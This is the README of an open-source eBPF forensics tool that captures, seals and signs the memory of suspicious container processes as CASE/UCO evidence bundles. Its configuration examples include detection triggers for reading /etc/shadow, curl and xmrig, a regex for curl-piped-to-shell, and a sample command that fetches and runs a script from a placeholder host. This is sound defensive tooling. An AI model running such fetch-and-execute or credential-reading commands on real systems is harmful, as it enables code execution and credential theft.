# Flight Recorder

**Forensic preservation for ephemeral compute.**

[](https://github.com/Unspekable1654/flight-recorder/actions/workflows/build.yaml)
[](https://github.com/Unspekable1654/flight-recorder/releases/latest)
[](LICENSE)
[](go.mod)
[](https://caseontology.org/)



<sub>Real output from `flight-recorder demo`. It runs on Windows, macOS and Linux — no kernel, no root, no cluster.</sub>

---

## What this does, in plain English

Skip this section if you already know what eBPF is.

Modern software runs in **containers**: small, disposable boxes that start, do
a job, and get thrown away — often within minutes.

That is a problem when something goes wrong. If an attacker breaks into a
container, the evidence that matters lives only in that container's memory:
the password they stole, the address of the machine they were sending it to,
the code they were running. None of that gets written to a log file. Security
alerts usually arrive tens of minutes later, and by then the container has
been deleted and its memory reused. The investigator arrives at an empty room.

Flight Recorder runs on the machine and watches for suspicious behaviour. The
moment it sees any, it photographs the memory of the process responsible —
without pausing, signalling or otherwise disturbing that process — and locks
the photograph in a sealed, digitally signed envelope. Change a single byte of
it afterwards and the seal breaks, loudly and provably.

What comes out is evidence that still holds up years later, written in a
format that professional forensics tools already read.

> The name is the aviation analogy: an aircraft's flight recorder is not what
> makes a plane safe. It is what makes a crash explainable.

**Where this sits:** other tools answer *"did something bad happen?"* and hand
you a log line. This one answers *"what was actually inside that process?"* and
preserves the answer. See [the comparison below](#why-this-is-not-another-ebpf-security-tool).

---

## Try it in 60 seconds

You do not need Linux, root, a cluster, or a Go toolchain to see this work.
The part that seals, signs, encrypts and verifies evidence is ordinary
software and runs anywhere.

1. Download the archive for your machine from
   [the latest release](https://github.com/Unspekable1654/flight-recorder/releases/latest)
   — `.zip` for Windows, `.tar.gz` for macOS and Linux.
2. Unpack it.
3. Run one command:

```
flight-recorder demo
```

It fabricates a memory image, plants an attacker's command inside it, and puts
that through the real pipeline: Merkle seal, ECDSA signature, CASE/UCO
rendering, compression, encryption, then verification. It finishes by flipping
a single byte and showing verification correctly fail.

Nothing is simulated except the memory image itself.

**Or verify a sealed bundle without running anything**, using the sample
committed to this repository:

```
flight-recorder verify --bundle examples/demo-bundle --key examples/demo-pub.pem
```

You can also just [read that bundle in your browser](examples/) — four of its
six files are plaintext, on purpose.

Live memory acquisition (`capture` and `start`) is the part that does need
Linux: it is built on eBPF and `process_vm_readv(2)`.

---

## What verification looks like

```
$ flight-recorder verify --bundle ./evidence/6b3f8dbe-... --key key.pem

  [ OK ] manifest file digests        5 file(s)
  [ OK ] payload decryption
  [ OK ] payload sha256               ba76e6fefaa322e6b017287ddab8c8b2...
  [ OK ] merkle root                  c60318963689c015e04659f307f71fb8...
  [ OK ] leaf count
  [ OK ] ecdsa signature
  [ OK ] signer key id
  [ OK ] CASE/UCO structure

VERIFIED  6b3f8dbe-0575-4b2d-937c-978a24a09430  (merkle root c60318963689c015...)
```

Hand it only the **public** key — the position a third-party examiner is in —
and the content checks are reported as skipped rather than failed, because
they genuinely could not be run:

```
$ flight-recorder verify --bundle ./evidence/6b3f8dbe-... --key pub.pem

  [ OK ] manifest file digests        5 file(s)
  [SKIP] payload decryption
  [SKIP] payload sha256
  [SKIP] merkle root
  [SKIP] leaf count
  [ OK ] ecdsa signature
  [ OK ] signer key id
  [ OK ] CASE/UCO structure

SEAL VERIFIED  6b3f8dbe-0575-4b2d-937c-978a24a09430
```

An examiner should never be shown a red failure on evidence that is intact.

---

## How it earns the name

eBPF probes watch process execution inside the kernel. When an execution
matches a trigger rule, the process's memory is acquired with
`process_vm_readv(2)` — without stopping, signalling or ptrace-attaching the
target — then sealed with a SHA-256 Merkle tree, signed with ECDSA P-256, and
written as a [CASE/UCO](https://caseontology.org/) JSON-LD bundle that an
examiner can verify independently, years later, with no access to this tool.

---

## Why this is not another eBPF security tool

Tracee detects. Tetragon enforces. Falco alerts. All three answer *"did
something bad happen?"* and then hand you a log line.

Flight Recorder answers a different question: *"what was actually in that
process?"* — and preserves the answer in a form that survives the container,
survives the node, and holds up under scrutiny.

|  | Tracee | Tetragon | Falco | **Flight Recorder** |
|---|---|---|---|---|
| Focus | Detect | Enforce | Alert | **Preserve** |
| Memory contents captured | ❌ | ❌ | ❌ | ✅ heap, stack, anonymous |
| Cryptographic sealing | ❌ | ❌ | ❌ | ✅ Merkle + ECDSA |
| Court-ready output | ❌ | ❌ | ❌ | ✅ CASE/UCO JSON-LD |
| Target process stopped | n/a | n/a | n/a | **Never** |

It is complementary, not competitive: run Falco for detection and Flight
Recorder for preservation.

---

## How it works

```
┌──────────────────────────── LINUX KERNEL ────────────────────────────┐
│                                                                       │
│   tracepoint/syscalls/sys_enter_execve ──┐                            │
│   tracepoint/sched/sched_process_exit  ──┤                            │
│                                          ▼                            │
│                            BPF_MAP_TYPE_RINGBUF (16 MB, lock-free)    │
└──────────────────────────────────┬────────────────────────────────────┘
                                   │  fr_event: host pid, ns pid, cgroup,
                                   │  CLOCK_BOOTTIME timestamp, comm, argv
┌──────────────────────────────────▼──────────── USERSPACE ────────────┐
│                                                                       │
│  rule engine  ──▶  worker pool  ──▶  process_vm_readv acquisition     │
│  (regex over        (bounded,          (heap + stack + anonymous,     │
│   full cmdline)      rate limited)      never stops the target)       │
│                                          │                            │
│                    ┌─────────────────────┼─────────────────────┐      │
│                    ▼                     ▼                     ▼      │
│            Merkle seal (4 KB)    CASE/UCO JSON-LD      zstd + AES-GCM │
│            + ECDSA P-256         (validated)           evidence bundle│
│                    │                     │                     │      │
│                    └──────────┬──────────┴─────────────────────┘      │
│                               ▼                                       │
│         SIEM / SOAR: metadata, hashes and a URI — never the dump      │
└───────────────────────────────────────────────────────────────────────┘
```

Design decisions worth knowing before you deploy:

- **The ring buffer reader never blocks.** Matching happens on the reader
  goroutine; acquisition happens on a bounded worker pool. When the pool
  saturates the pipeline drops *explicitly*, counts the drop, and writes it to
  the audit log. A recorded drop is knowledge; a silent one is a lie.
- **Acquisition is single-pass.** The address map is parsed once and read once.
  It is never re-parsed and retried, because by the time a retry would run, the
  PID may belong to a different process.
- **Partial evidence is labelled, not hidden.** Unreadable regions, size caps
  and shutdown interruptions each produce a distinct, signed status.
- **The dump never leaves the node.** SIEM and SOAR receive metadata, hashes
  and a URI. Forwarding half a gigabyte of raw memory — full of other people's
  credentials — into a log platform is both ruinous and a data-protection
  incident.

Full rationale, including the trade-offs that were rejected, is in
[docs/architecture.md](docs/architecture.md).

---

## Quick start

### From source, with no kernel, no root and no cluster

A prebuilt binary is the faster route — see [Try it in 60 seconds](#try-it-in-60-seconds).
To build it yourself:

```bash
go build -o flight-recorder ./cmd/flight-recorder
./flight-recorder demo
```

`demo` runs the real pipeline against a synthetic capture: seal, sign, render
CASE/UCO, compress, encrypt, write the bundle, verify it — then flip one byte
and show verification correctly fail.

This builds on Windows and macOS too. `make build-cross` produces every
published target at once, including `flight-recorder.exe`.

### Capture a live process

```bash
sudo ./flight-recorder capture --pid 48291 --output ./evidence --key ./key.pem
sudo ./flight-recorder verify  --bundle ./evidence/<case-id> --key ./key.pem
```

### Run the monitor

```bash
sudo ./flight-recorder start \
  --trigger "cat /etc/shadow,curl,xmrig" \
  --output ./evidence \
  --key ./key.pem
```

In another terminal, `cat /etc/shadow`. The capture appears in the log,
complete with the Merkle root.

### Deploy to Kubernetes

```bash
# Generate and install a signing key first. Evidence sealed with a key you
# then lose can never be verified or decrypted again.
flight-recorder keygen --key key.pem --pub pub.pem
kubectl create namespace flight-recorder
kubectl -n flight-recorder create secret generic flight-recorder-signing-key --from-file=key.pem

kubectl apply -f deploy/k8s/rbac.yaml
kubectl apply -f deploy/k8s/configmap.yaml
kubectl apply -f deploy/k8s/daemonset.yaml
```

or with Helm:

```bash
helm install flight-recorder deploy/helm/flight-recorder \
  --namespace flight-recorder --create-namespace \
  --set export.webhook.enabled=true \
  --set export.webhook.url=https://soar.internal/hooks/flight-recorder
```

A pod that is **Running but not Ready** means the eBPF programs did not attach:
that node is unmonitored. The readiness probe reports it precisely so this
never goes unnoticed.

---

## Requirements

| Component | Minimum | Recommended | Why |
|---|---|---|---|
| Linux kernel | 5.8 | 6.1+ | BPF ring buffer (5.8), CO-RE with BTF |
| BTF | `/sys/kernel/btf/vmlinux` | — | CO-RE relocation, no kernel headers at runtime |
| Go | **1.25** | 1.25+ | build only; the floor is set by `cilium/ebpf` v0.22 |
| clang/LLVM | 14 | 17+ | only to modify `bpf/recorder.c` |
| Capabilities | `SYS_PTRACE`, `BPF`, `PERFMON`, `SYS_RESOURCE` | — | acquisition, probe loading, ring buffer memory |

`hostPID: true` is **required**. eBPF reports host-namespace PIDs; a recorder
confined to its own PID namespace cannot resolve them. It detects this at
startup and says so loudly.

The generated eBPF object is committed, so `go build` needs no clang. Only
`make generate` does.

---

## Configuration

The trigger ruleset is a ConfigMap, hot-reloaded on change with no restart and
no monitoring gap. A ruleset that fails validation is **rejected**, and the
previous one stays active — a bad push degrades to "no change", never to "no
monitoring".

```yaml
mode: trigger                 # or "all" during an active incident
max_captures_per_minute: 10   # anti-DoS: an attacker can trigger captures too
max_dump_size_mb: 512
max_disk_usage_mb: 1024       # never fill the node's disk
retention_days: 90

rules:
  - name: curl_pipe_sh
    match_regex: '(curl|wget)[^|]*\|\s*(ba)?sh'
    severity: critical
    mitre: T1059.004
```

Test rules before deploying them:

```bash
flight-recorder rules validate --config triggers.yaml
flight-recorder rules test --config triggers.yaml \
  --cmdline "/bin/sh -c curl -s http://x/p.sh | sh"
```

Full schema and every flag: [docs/runbook.md](docs/runbook.md).

---

## What an evidence bundle contains

```
evidence/<case-id>/
├── manifest.json        inventory with a digest and role for every file
├── metadata.jsonld      CASE/UCO bundle — metadata and hashes, plaintext
├── receipt.json         signed Merkle receipt: root, tree parameters, status
├── regions.json         memory map, per-region outcome, offset within the dump
├── dump.bin.zst.enc     the payload: zstd, then AES-256-GCM in 1 MB frames
└── dump.bin.sha256      digest of the plaintext payload
```

Everything except the payload is readable without the key, so triage does not
require handing the decryption key — and therefore every credential in the
dump — to whoever is doing the triage. Verifying with the public key alone
returns `SEAL VERIFIED`: the signature, manifest digests and CASE/UCO document
are proven, and the content checks are reported as skipped, not failed.

```bash
flight-recorder inspect --bundle ./evidence/<case-id>          # no key needed
flight-recorder verify  --bundle ./evidence/<case-id> --key pub.pem
flight-recorder decrypt --bundle ./evidence/<case-id> --key key.pem --out dump.bin
```

---

## Integrations

Metadata only, on every channel:

- **Splunk HEC** — CIM field names, so existing dashboards work unmodified
- **Elasticsearch** — ECS documents (`event.*`, `process.*`, `container.*`)
- **Syslog** — RFC 5424 structured data, or CEF for ArcSight and QRadar
- **Webhook** — the SOAR integration point, with retry and backoff
- **gRPC** — pull evidence and subscribe to captures from a playbook
- **Prometheus** — capture latency, ring buffer loss, CPU, disk, drops

---

## Legal admissibility

| Standard | Requirement | How this is met |
|---|---|---|
| **Daubert** (US) | Testable, peer-reviewable, known error rate | Open source; deterministic algorithm; SHA-256 collision probability 2⁻¹²⁸ |
| **ISO/IEC 27037** | Tool identity, method, hash verification, custody | Receipt records tool version, commit, *binary self-hash*, kernel version, timestamps, operator |
| **ACPO** (UK) | Acquisition must not alter the evidence | `process_vm_readv` is read-only; the target is never stopped or signalled |
| **FRE 901(b)(9)** (US) | Authentication by a process or system | ECDSA-signed Merkle root plus a CASE/UCO provenance chain |

CASE/UCO is endorsed by INTERPOL, Europol EC3 and NIST, so the output enters an
existing forensic workflow without re-collection.

**Deviation from the design documents, stated openly:** those documents place
`InvestigativeAction` and `ProvenanceRecord` in the `case-core` namespace. In
the published CASE 1.3.0 ontology both live in `case-investigation`. This
implementation follows the published ontology — output a CASE validator rejects
is not interoperable, whatever an internal document says. Tool-specific fields
(container identity, Merkle parameters, acquisition completeness) are emitted
under a documented `fr:` extension namespace, which is the mechanism CASE
itself prescribes.

---

## Limitations

Stated plainly, because a forensic tool that overstates its reach is worse than
no tool at all.

- **Kernel rootkits.** If the kernel is compromised, eBPF and `/proc` both lie.
  Outside the threat model.
- **Encrypted memory.** SGX/TDX enclave contents cannot be read. No workaround.
- **Pre-trigger exfiltration.** If the attacker finishes before any monitored
  syscall fires, there is nothing to capture. Mitigation: `mode: all`, at
  higher CPU cost.
- **Anti-eBPF.** Root inside the host can unload BPF programs. Pinning to bpffs
  raises the bar; it does not remove it.
- **PID reuse.** Between event and acquisition a PID can be recycled. Mitigated
  by validating cgroup id and process start time before reading, and captures
  are refused rather than risked.
- **argv truncation.** The probe copies at most four arguments of 64 bytes.
  Rules match substrings for this reason.
- **Memory dumps are radioactive.** They contain credentials, tokens and
  personal data belonging to people who are not the subject of the
  investigation. Encrypted at rest by default; optional redaction; 90-day
  default retention. Treat decrypted output accordingly.

---

## Development

```bash
make help              # every target
make check             # fmt, vet, unit tests with -race
make test-integration  # needs root: real eBPF, real process_vm_readv
make fuzz              # the /proc/maps parser takes hostile input
make bench             # Merkle sealing throughput
make generate          # rebuild the eBPF object (needs clang)
make demo              # full pipeline, synthetic capture
```

Measured on Linux 6.6 (WSL2, 22 cores), from the integration suite:

| Measurement | Result |
|---|---|
| Acquisition throughput | ~3.0 GB/s (38 MB in 12.4 ms, p50) |
| Small process capture | 373 KB across 9 regions in 0.4 ms |
| Trigger → sealed, verified bundle | 13 ms end to end |
| Ring buffer under 1000 rapid execs | 1001 seen, 1001 delivered, 0 dropped |
| Maps-parse → first read gap (race window) | 0.03 ms |

Reproduce with `sudo make test-integration`. These are one machine's numbers,
not a benchmark suite; the methodology is in
[docs/whitepaper.md](docs/whitepaper.md).

---

## Documentation

- [docs/architecture.md](docs/architecture.md) — architecture decision records
- [docs/runbook.md](docs/runbook.md) — deployment, tuning, incident procedures
- [docs/whitepaper.md](docs/whitepaper.md) — technical paper with evaluation
- [docs/pitch-deck.md](docs/pitch-deck.md) — the short version, for a non-specialist audience
- [examples/](examples/) — a real sealed evidence bundle you can verify yourself
- [test/scenarios/](test/scenarios/) — five adversary emulation scenarios
- [SECURITY.md](SECURITY.md) — threat model and vulnerability disclosure
- [CONTRIBUTING.md](CONTRIBUTING.md) — development setup and standards

## License

Copyright 2026 Aalok. Apache 2.0 — see [LICENSE](LICENSE) and [NOTICE](NOTICE).

Chosen over MIT for its patent grant, and over GPL so that enterprises can
write closed SIEM and SOAR integrations without licensing consequences.
